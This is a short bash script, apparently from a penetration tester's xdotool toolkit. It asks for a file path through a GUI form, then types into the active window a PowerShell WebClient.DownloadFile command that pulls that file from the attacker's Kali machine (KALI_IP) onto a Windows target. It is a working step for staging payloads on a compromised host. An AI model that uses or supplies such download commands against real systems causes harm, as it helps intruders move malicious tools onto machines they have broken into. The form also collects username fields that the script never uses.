#!/bin/bash

: '
PowerShell: Download file from webroot.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Path" "Domain\Username" "Request user"

B_PATH=${form_data["Path"]}
F_NAME=$(basename $B_PATH)

paste_command "powershell \"(New-Object System.Net.WebClient).DownloadFile('http://${KALI_IP}/${B_PATH}', '${F_NAME}')\""
xdotool key Return
